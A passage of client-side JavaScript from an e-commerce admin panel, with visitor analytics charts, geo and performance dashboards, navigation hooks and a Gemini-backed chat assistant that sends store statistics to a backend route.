            { label: 'Page views', data: pts.map(p => p.pageviews), borderColor: '#A97A1E', backgroundColor: 'transparent', fill: false, tension: 0.35, borderWidth: 2, borderDash: [5, 4], pointRadius: 0, pointHoverRadius: 4 },
            { label: 'Orders',    data: pts.map(p => p.conversions), borderColor: '#C2434F', backgroundColor: 'transparent', fill: false, tension: 0.35, borderWidth: 2, pointRadius: 0, pointHoverRadius: 4, yAxisID: 'y1' }
          ]
        },
        options: {
          responsive: true, maintainAspectRatio: false,
          interaction: { mode: 'index', intersect: false },
          plugins: { legend: { position: 'bottom', labels: { boxWidth: 12, font: { size: 11 } } } },
          scales: {
            y:  { beginAtZero: true, ticks: { precision: 0 }, grid: { color: 'rgba(84,113,119,0.10)' } },
            y1: { beginAtZero: true, position: 'right', ticks: { precision: 0 }, grid: { display: false }, title: { display: true, text: 'Orders', font: { size: 10 } } },
            x:  { grid: { display: false }, ticks: { maxTicksLimit: 12, font: { size: 10 } } }
          }
        }
      });
    }

    // ── breakdowns ──
    _vaDeviceChart = _vaDoughnut(_vaDeviceChart, 'vaDeviceChart', d.devices);
    _vaOsChart     = _vaDoughnut(_vaOsChart,     'vaOsChart',     d.os);
    _vaLegend('vaDeviceLegend', d.devices);
    _vaLegend('vaOsLegend',     d.os);
    _vaBars('vaBrowserBars', d.browsers);
    _vaBars('vaSourceBars',  d.sources);
    _vaTable('vaPagesTbody',  d.pages,  'No page views in this period');
    _vaTable('vaCitiesTbody', d.cities, 'No location data yet');

    const dTop = (d.devices || [])[0], oTop = (d.os || [])[0];
    const dt = document.getElementById('vaDeviceTop');
    const ot = document.getElementById('vaOsTop');
    if (dt) dt.textContent = dTop ? `${dTop.label} ${dTop.pct}%` : '–';
    if (ot) ot.textContent = oTop ? `${oTop.label} ${oTop.pct}%` : '–';

    if (state) {
      state.innerHTML = `<span style="color:var(--green-text);font-weight:700;">${_vaEsc(d.label || '')}</span>
        · ${_vaNum(o.sessions)} visitors · ${_vaNum(o.pageviews)} page views
        · updated ${new Date().toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit' })}`;
    }
  } catch (e) {
    if (state) {
      state.style.color = 'var(--red)';
      const aborted = /abort/i.test(String(e.message)) || (e.name === 'AbortError');
      state.innerHTML = aborted
        ? `Could not load analytics — the server did not respond in time${_vaEsc(e.message).replace(/^ — .*/, '')}.
           <span style="color:var(--text3);">Under heavy traffic the backend queues requests and cold starts can take
           30–60s. Pull to refresh, or check the server is healthy in Settings · Performance.</span>`
        : `Could not load analytics — ${_vaEsc(e.message)}.
           <span style="color:var(--text3);">Deploy <code>analytics-routes.js</code> and run
           <code>analytics-schema.sql</code>, then refresh. No sample data is shown.</span>`;
    }
  } finally {
    _vaLoading = false;
  }
}

document.addEventListener('click', function (e) {
  const b = e.target.closest('.va-range');
  if (b) loadVisitorAnalytics(b.dataset.range);
});

/* Load the analytics section the first time the Live Visitors page is
   opened, following this file's existing convention of wrapping showPage
   rather than editing it. */
(function () {
  const _origSP = window.showPage;
  let loadedOnce = false;
  window.showPage = function (name) {
    const r = _origSP ? _origSP.apply(this, arguments) : undefined;
    if (name === 'livevisitors') {
      if (!loadedOnce) { loadedOnce = true; setTimeout(() => loadVisitorAnalytics(_vaRange), 120); }
    }
    return r;
  };
})();

function _lvAddStream(msg) {
  _lvStream.unshift(msg);
  if(_lvStream.length>20) _lvStream.pop();
  const el=document.getElementById('lvActivityStream'); if(!el) return;
  el.innerHTML=_lvStream.map((m,i)=>`<div class="stream-item" style="opacity:${(1-i*0.04).toFixed(2)}">
    <div style="width:7px;height:7px;border-radius:50%;background:var(--green-text);flex-shrink:0;"></div>
    <div style="flex:1;font-size:0.77rem;color:var(--text2);">${m}</div>
    <div style="font-size:0.65rem;color:var(--text3);white-space:nowrap;">${new Date().toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'})}</div>
  </div>`).join('');
}
function clearLvStream(){_lvStream=[];const el=document.getElementById('lvActivityStream');if(el)el.innerHTML='<div style="color:var(--text3);font-size:0.8rem;padding:16px;text-align:center;">Cleared</div>';}

function _lvPageDist(sessions){
  const el=document.getElementById('lvPageDist'); if(!el) return;
  const map={};
  sessions.forEach(s=>{map[s.page||'/']=(map[s.page||'/']||0)+1;});
  const total=sessions.length||1;
  const entries=Object.entries(map).sort((a,b)=>b[1]-a[1]);
  if(!entries.length){el.innerHTML='<span style="color:var(--text3);font-size:0.8rem;">No data yet</span>';return;}
  el.innerHTML=entries.map(([pg,n])=>`<div style="background:var(--surface2);border-radius:8px;padding:5px 10px;display:flex;align-items:center;gap:8px;">
    <span style="font-family:var(--mono);font-size:0.72rem;color:var(--green-text);">${pg}</span>
    <span class="badge badge-gray">${n}</span>
    <div style="background:var(--border);border-radius:2px;height:3px;width:50px;"><div style="background:var(--green);width:${(n/total*100).toFixed(0)}%;height:100%;border-radius:2px;"></div></div>
  </div>`).join('');
}

function _drawLvTraffic(){
  const c=document.getElementById('lvTrafficCanvas'); if(!c) return;
  const dpr=window.devicePixelRatio||1, W=c.clientWidth||300, H=160;
  c.width=W*dpr; c.height=H*dpr; c.style.width=W+'px'; c.style.height=H+'px';
  const ctx=c.getContext('2d'); ctx.scale(dpr,dpr);
  const data=_lvTraff.slice(-30); if(data.length<2) return;
  const max=Math.max(...data,1);
  const pad={t:10,r:10,b:16,l:28};
  const cW=W-pad.l-pad.r, cH=H-pad.t-pad.b;
  const ptX=i=>pad.l+(i/(data.length-1))*cW;
  const ptY=v=>pad.t+cH-(v/max)*cH;
  const grd=ctx.createLinearGradient(0,pad.t,0,pad.t+cH);
  grd.addColorStop(0,'rgba(94,171,48,0.35)'); grd.addColorStop(1,'rgba(94,171,48,0)');
  ctx.beginPath(); ctx.moveTo(ptX(0),pad.t+cH);
  data.forEach((v,i)=>ctx.lineTo(ptX(i),ptY(v)));
  ctx.lineTo(ptX(data.length-1),pad.t+cH); ctx.closePath(); ctx.fillStyle=grd; ctx.fill();
  ctx.beginPath();
  data.forEach((v,i)=>i===0?ctx.moveTo(ptX(i),ptY(v)):ctx.lineTo(ptX(i),ptY(v)));
  ctx.strokeStyle='#547177'; ctx.lineWidth=2; ctx.shadowColor='#547177'; ctx.shadowBlur=5; ctx.stroke(); ctx.shadowBlur=0;
  ctx.beginPath();ctx.arc(ptX(data.length-1),ptY(data[data.length-1]),4,0,Math.PI*2);
  ctx.fillStyle='#547177';ctx.shadowColor='#547177';ctx.shadowBlur=10;ctx.fill();ctx.shadowBlur=0;
}

function _drawGlobe(){
  const c=document.getElementById('visitorGlobeCanvas'); if(!c) return;
  const dpr=window.devicePixelRatio||1, W=c.clientWidth||280, H=240;
  c.width=W*dpr; c.height=H*dpr; c.style.width=W+'px'; c.style.height=H+'px';
  const ctx=c.getContext('2d'); ctx.scale(dpr,dpr);
  const cx=W/2,cy=H/2,r=Math.min(W,H)*0.4;
  const sg=ctx.createRadialGradient(cx-r*0.3,cy-r*0.3,r*0.05,cx,cy,r);
  sg.addColorStop(0,'rgba(94,171,48,0.18)');sg.addColorStop(0.7,'rgba(15,20,16,0.9)');sg.addColorStop(1,'rgba(10,13,10,0.97)');
  ctx.beginPath();ctx.arc(cx,cy,r,0,Math.PI*2);ctx.fillStyle=sg;ctx.fill();
  ctx.strokeStyle='rgba(216,103,110,0.12)';ctx.lineWidth=0.7;
  const ang=_lvGlobAng*Math.PI/180;
  [-60,-30,0,30,60].forEach(lat=>{
    const ry=Math.cos(lat*Math.PI/180)*r, rz=Math.sin(lat*Math.PI/180)*r;
    ctx.beginPath();ctx.ellipse(cx,cy+rz,ry,ry*0.13,0,0,Math.PI*2);ctx.stroke();
  });
  for(let lon=0;lon<180;lon+=30){
    const a=(lon*Math.PI/180)+ang;
    ctx.beginPath();ctx.ellipse(cx,cy,r*Math.abs(Math.cos(a)),r,a,0,Math.PI*2);ctx.stroke();
  }
  for(let i=0;i<4;i++){
    const lat2=(Math.random()*110-55)*Math.PI/180;
    const lon2=Math.random()*Math.PI*2+ang;
    if(Math.cos(lat2)*Math.cos(lon2-ang)<=0) continue;
    const dx=cx+r*Math.cos(lat2)*Math.sin(lon2), dy=cy-r*Math.sin(lat2);
    const pulse=((Date.now()/800+i)%2);
    ctx.beginPath();ctx.arc(dx,dy,3+pulse*5,0,Math.PI*2);
    ctx.strokeStyle=`rgba(94,171,48,${(0.5-pulse*0.25).toFixed(2)})`;ctx.lineWidth=1.5;ctx.stroke();
    ctx.beginPath();ctx.arc(dx,dy,3,0,Math.PI*2);
    ctx.fillStyle='#7EC850';ctx.shadowColor='#7EC850';ctx.shadowBlur=8;ctx.fill();ctx.shadowBlur=0;
  }
  _lvGlobAng=(_lvGlobAng+0.4)%360;
}

function startGlobeAnimation(){
  if(_lvGlobRAF) cancelAnimationFrame(_lvGlobRAF);
  const loop=()=>{_drawGlobe();_lvGlobRAF=requestAnimationFrame(loop);};
  loop();
}

const _v26_slvOrig = startLiveVisitors;
startLiveVisitors = function(){
  _v26_slvOrig();
  startGlobeAnimation();
};

// ── Geo Analytics ──────────────────────────────────────
function loadGeoAnalytics(){
  if(!allOrders.length){toast('Load dashboard first','warning');return;}
  const cityMap={};
  allOrders.forEach(o=>{
    const city=o.city||o.address_city||'Unknown';
    if(!cityMap[city]) cityMap[city]={orders:0,revenue:0,state:o.state||''};
    cityMap[city].orders++; cityMap[city].revenue+=parseFloat(o.total||0);
  });
  const stateMap={};
  Object.values(cityMap).forEach(c=>{stateMap[c.state||'?']=(stateMap[c.state||'?']||0)+c.orders;});
  const topCity=Object.entries(cityMap).sort((a,b)=>b[1].orders-a[1].orders)[0];
  const topState=Object.entries(stateMap).sort((a,b)=>b[1]-a[1])[0];
  const se=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v;};
  se('geoTopState',topState?.[0]||'--'); se('geoTopCity',topCity?.[0]||'--');
  se('geoStateCount',Object.keys(stateMap).length); se('geoCityCount',Object.keys(cityMap).length);
  se('geoMapCount',Object.keys(cityMap).length+' cities');
  const src=document.getElementById('indiaMap'), dst=document.getElementById('geoIndiaMap');
  if(src&&dst) dst.innerHTML=src.innerHTML;
  const topCities=Object.entries(cityMap).sort((a,b)=>b[1].orders-a[1].orders).slice(0,10);
  const maxC=topCities[0]?.[1].orders||1;
  const colors=['#547177','#3B7EA6','#8F6417','#7C3AED','#E87020','#E53535','#06B6D4','#EC4899','#10B981','#F59E0B'];
  const el=document.getElementById('geoCitiesChart');
  if(el) el.innerHTML=topCities.map(([city,info],i)=>`<div class="rank-row">
    <div class="rank-num">${i+1}</div>
    <div style="display:flex;flex-direction:column;gap:3px;flex:1;min-width:0;">
      <div style="display:flex;justify-content:space-between;"><span class="rank-label">${city}</span><span class="rank-val">${info.orders} orders</span></div>
      <div class="rank-bar"><div class="rank-fill" style="width:${(info.orders/maxC*100).toFixed(1)}%;background:${colors[i%colors.length]};"></div></div>
    </div>
  </div>`).join('');
  const revE=Object.entries(cityMap).sort((a,b)=>b[1].revenue-a[1].revenue).slice(0,8);
  if(revE.length) setTimeout(()=>drawHBarChart('geoRevCanvas',revE.map(e=>e[0]),revE.map(e=>e[1].revenue),colors),100);
}

// ── Performance ────────────────────────────────────────
function loadPerformance(){
  if(!allOrders.length){toast('Load dashboard first','warning');return;}
  const activeOrders=allOrders.filter(o=>{
    const f=String(o.fulfillment||o.status||'').trim().toLowerCase();
    return f!=='cancelled' && f!=='returned';
  });
  const paid=activeOrders.filter(o=>{
    const p=String(o.payment_status||'').trim().toLowerCase();
    return p.includes('paid') || p.includes('success') || p.includes('collected');
  });
  const delivered=activeOrders.filter(o=>String(o.fulfillment||o.status||'').trim().toLowerCase()==='delivered');
  const aov=paid.length?paid.reduce((s,o)=>s+parseFloat(o.total||0),0)/paid.length:0;
  const conv=activeOrders.length?paid.length/activeOrders.length*100:0;
  const del=activeOrders.length?delivered.length/activeOrders.length*100:0;
  const se=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v;};
  se('perfConvRate',conv.toFixed(1)+'%'); se('perfAOV','₹'+fmtNum(Math.round(aov)));
  se('perfPaySucc',conv.toFixed(1)+'%'); se('perfDelRate',del.toFixed(1)+'%');
  const fe=document.getElementById('perfFunnel');
  if(fe){
    const steps=[
      {l:'Active Orders',n:activeOrders.length,c:'#547177'},
      {l:'Paid / Collected',n:paid.length,c:'#3B7EA6'},
      {l:'Processing',n:activeOrders.filter(o=>String(o.fulfillment||o.status||'').trim().toLowerCase()==='processing').length,c:'#8F6417'},
      {l:'Shipped',n:activeOrders.filter(o=>String(o.fulfillment||o.status||'').trim().toLowerCase()==='shipped').length,c:'#E87020'},
      {l:'Delivered',n:delivered.length,c:'#7C3AED'}
    ];
    const maxN=steps[0].n||1;
    fe.innerHTML=steps.map(s=>`<div style="margin-bottom:10px;">
      <div style="display:flex;justify-content:space-between;margin-bottom:3px;">
        <span style="font-size:0.78rem;color:var(--text2);">${s.l}</span>
        <span style="font-family:var(--mono);font-size:0.75rem;">${s.n} (${(s.n/maxN*100)|0}%)</span>
      </div>
      <div style="background:var(--border);border-radius:4px;height:10px;overflow:hidden;">
        <div style="height:100%;width:${s.n/maxN*100}%;background:${s.c};border-radius:4px;box-shadow:0 0 8px ${s.c}60;transition:width 1s ease;"></div>
      </div>
    </div>`).join('');
  }
  const n30=Array.from({length:30},(_,i)=>{const d=new Date();d.setDate(d.getDate()-(29-i));return{label:d.getDate()+'/'+(d.getMonth()+1),date:d.toISOString().split('T')[0],rev:0};});
  allOrders.forEach(o=>{const b=n30.find(b=>b.date===(o.created_at||'').split('T')[0]);if(b)b.rev+=parseFloat(o.total||0);});
  const inStock=allProducts.filter(p=>!p.deleted_at&&(p.stock||0)>10).length;
  const totP=allProducts.filter(p=>!p.deleted_at).length||1;
  setTimeout(()=>{
    drawAreaChart('perfTrendCanvas',n30.map(b=>b.label),n30.map(b=>b.rev),chartTheme().primary);
    drawRing('perfRing1',conv,chartTheme().secondary,'Paid / Collected');
    drawRing('perfRing2',del,chartTheme().primary,'Delivered');
    drawRing('perfRing3',inStock/totP*100,'#8F6417','Stock OK');
  },120);
}

// ── showPage hook ──────────────────────────────────────
const _v26_spOrig = showPage;
showPage = function(name){
  _v26_spOrig(name);
  if(name==='geoanalytics') setTimeout(loadGeoAnalytics,120);
  if(name==='performance')  setTimeout(loadPerformance,120);
  if(name==='livevisitors') setTimeout(startGlobeAnimation,200);
  if(name==='discounts')    setTimeout(()=>{renderDiscountsNew();renderDiscountKpis();},120);
};

/* ══ block 9 ══ */

// ══════════════════════════════════════
// BOTTOM NAV SYNC
// ══════════════════════════════════════
function syncAbn(page) {
  document.querySelectorAll('.abn-btn').forEach(b => b.classList.remove('active'));
  const btn = document.getElementById('abn-' + page);
  if (btn) btn.classList.add('active');
}

function openAdminMoreMenu() {
  document.getElementById('adminMoreMenu').classList.add('open');
  document.getElementById('adminMoreOverlay').classList.add('open');
}
function closeAdminMoreMenu() {
  document.getElementById('adminMoreMenu').classList.remove('open');
  document.getElementById('adminMoreOverlay').classList.remove('open');
}

// Sync order pending badge
function syncPendingBadge() {
  const pend = (typeof allOrders !== 'undefined' ? allOrders : [])
    .filter(o => (o.fulfillment||o.status||'')=== 'Pending').length;
  const dot = document.getElementById('abnPendingDot');
  if (dot) {
    dot.style.display = pend > 0 ? 'flex' : 'none';
    dot.textContent = pend > 9 ? '9+' : String(pend);
  }
}

// Patch showPage after DOMContentLoaded
document.addEventListener('DOMContentLoaded', function() {
  const _origSP = window.showPage;
  if (_origSP) {
    window.showPage = function(pg) {
      _origSP(pg);
      syncAbn(pg);
      setTimeout(syncPendingBadge, 300);
    };
  }
  // Patch loadDashboard to sync badge after load
  const _origLD = window.loadDashboard;
  if (_origLD) {
    window.loadDashboard = async function() {
      await _origLD();
      syncPendingBadge();
    };
  }
  // Initial sync
  syncAbn('dashboard');
});

// ══════════════════════════════════════
// GEMINI AI ASSISTANT
// ══════════════════════════════════════
// NOTE: Key is stored in GEMINI_API_KEY env var on Render — never in frontend code.
let _geminiHistory = [];
let _geminiOpen = false;

function toggleGeminiPanel() {
  _geminiOpen = !_geminiOpen;
  const panel = document.getElementById('geminiPanel');
  panel.style.display = _geminiOpen ? 'flex' : 'none';
  document.getElementById('geminiFab').textContent = _geminiOpen ? '✕' : '✨';
  if (_geminiOpen) document.getElementById('geminiInp').focus();
}

function geminiQuick(text) {
  document.getElementById('geminiInp').value = text;
  geminiSend();
}

function _geminiAddMsg(text, role) {
  const box = document.getElementById('geminiMsgs');
  const time = new Date().toLocaleTimeString('en-IN', {hour:'2-digit',minute:'2-digit'});
  const wrap = document.createElement('div');
  wrap.style.cssText = role === 'user'
    ? 'max-width:88%;padding:10px 13px;border-radius:14px;border-bottom-right-radius:4px;background:#4285F4;color:#fff;font-size:12px;line-height:1.55;align-self:flex-end;'
    : 'max-width:90%;padding:10px 13px;border-radius:14px;border-bottom-left-radius:4px;background:var(--surface2);border:1px solid var(--border);color:var(--text);font-size:12px;line-height:1.55;align-self:flex-start;';
  wrap.innerHTML = text
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\n/g, '<br>')
    + '<div style="font-size:9px;color:'+(role==='user'?'rgba(255,255,255,0.6)':'var(--text3)')+';margin-top:4px;">'+time+'</div>';
  box.appendChild(wrap);
  box.scrollTop = box.scrollHeight;
}

function _geminiShowTyping() {
  const box = document.getElementById('geminiMsgs');
  const t = document.createElement('div');
  t.id = 'gTyping'; t.className = 'g-typing';
  t.innerHTML = '<span></span><span></span><span></span>';
  box.appendChild(t);
  box.scrollTop = box.scrollHeight;
}
function _geminiHideTyping() {
  const t = document.getElementById('gTyping'); if(t) t.remove();
}

function _buildStoreContext() {
  try {
    const o = typeof allOrders !== 'undefined' ? allOrders : [];
    const p = typeof allProducts !== 'undefined' ? allProducts : [];
    const today = new Date().toISOString().split('T')[0];
    const isPaid = x => { const s=(x.payment_status||'').toLowerCase(); return s.includes('paid')||s==='success'||s.includes('cod'); };
    const totalRev = o.filter(isPaid).reduce((s,x)=>s+parseFloat(x.total||0),0);
    const cod = o.filter(x=>(x.payment_status||'').toLowerCase().includes('cod'));
    const todayO = o.filter(x=>(x.created_at||'').startsWith(today));
    const pending = o.filter(x=>(x.fulfillment||x.status||'')=== 'Pending');
    const lowStock = p.filter(x=>!x.deleted_at&&(x.stock||0)<10);
    return JSON.stringify({
      totalOrders: o.length,
      todayOrders: todayO.length,
      totalRevenue: '₹'+Math.round(totalRev),
      codOrders: cod.length,
      codRevenue: '₹'+Math.round(cod.reduce((s,x)=>s+parseFloat(x.total||0),0)),
      pendingFulfillment: pending.length,
      lowStockProducts: lowStock.slice(0,8).map(x=>x.name+' ('+x.stock+')'),
      totalProducts: p.length
    });
  } catch(e) { return '{}'; }
}

async function geminiSend() {
  const inp = document.getElementById('geminiInp');
  const text = inp.value.trim();
  if (!text) return;

  // Guard: must be logged in
  if (!authToken) {
    _geminiAddMsg('⚠️ You need to be logged in to use the AI assistant.', 'bot');
    return;
  }

  inp.value = '';
  document.getElementById('geminiChips').style.display = 'none';
  _geminiAddMsg(text, 'user');
  _geminiHistory.push({ role: 'user', parts: [{ text }] });
  _geminiShowTyping();

  try {
    const res = await fetch(API + '/api/gemini', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + authToken },
      body: JSON.stringify({
        system_instruction: { parts: [{ text:
          'You are a smart AI assistant for Ozylix admin panel. ' +
          'You help manage a nutraceutical e-commerce store selling Vitamin C, Glutathione, Spirulina, Multivitamins. ' +
          'Current store data: ' + _buildStoreContext() + '. ' +
          'Be concise, actionable, use emojis. For WhatsApp messages, format ready to copy. ' +
          'Always refer to amounts in ₹ (Indian Rupees).'
        }] },
        contents: _geminiHistory,
        generationConfig: { maxOutputTokens: 500, temperature: 0.7 }
      }),
      signal: AbortSignal.timeout(25000),
    });
    _geminiHideTyping();

    if (!res.ok) {
      let errData = {};
      try { errData = await res.json(); } catch (_) { errData = {}; }
      // Never render a raw JS object into the chat — stringify objects and
      // translate them into a human-readable message.
      let msg = '';
      if (errData && typeof errData === 'object') {
        msg = errData.error || '';
        if (typeof msg !== 'string') {
          msg = errData.message || (errData.error && errData.error.message) || '';
          if (typeof msg !== 'string' || !msg) msg = 'Server error (HTTP ' + res.status + ')';
        }
      }
      if (res.status === 401 || res.status === 403) {
        _geminiAddMsg('⚠️ Session expired — please log out and log back in.', 'bot');
      } else if (res.status === 503) {
        _geminiAddMsg('⚠️ AI assistant is not configured yet. Add GEMINI_API_KEY (Gemini) or MANUS_LLM_PROXY_URL + MANUS_LLM_PROXY_KEY (Manus fallback) to the Render environment variables, then restart the service.', 'bot');
      } else if (msg) {
        _geminiAddMsg('⚠️ ' + msg, 'bot');
      } else {
        _geminiAddMsg('⚠️ Server error (HTTP ' + res.status + '). The backend could not complete the AI request — try again shortly.', 'bot');
      }
      return;
    }

    let data = null;
    try { data = await res.json(); } catch (e) { data = null; }
    if (!data || typeof data !== 'object') {
      _geminiAddMsg('⚠️ The AI service returned an unexpected response. Please try again.', 'bot');
      return;
    }
    const reply = data.candidates?.[0]?.content?.parts?.[0]?.text;
    if (!reply) {
      // Surface Gemini API-level errors (quota, safety, etc.)
      const geminiErr = data.error?.message || data.promptFeedback?.blockReason;
      _geminiAddMsg(geminiErr ? '⚠️ AI: ' + geminiErr : '⚠️ No response received. Please try again.', 'bot');
      return;
    }
    _geminiAddMsg(reply, 'bot');
    _geminiHistory.push({ role: 'model', parts: [{ text: reply }] });
  } catch(e) {
    _geminiHideTyping();
    const msg = e.name === 'TimeoutError' ? '⚠️ Request timed out — the AI is taking too long. Try a shorter question.' : '⚠️ Connection error: ' + e.message;
    _geminiAddMsg(msg, 'bot');
    console.error('Gemini error:', e);
  }
}


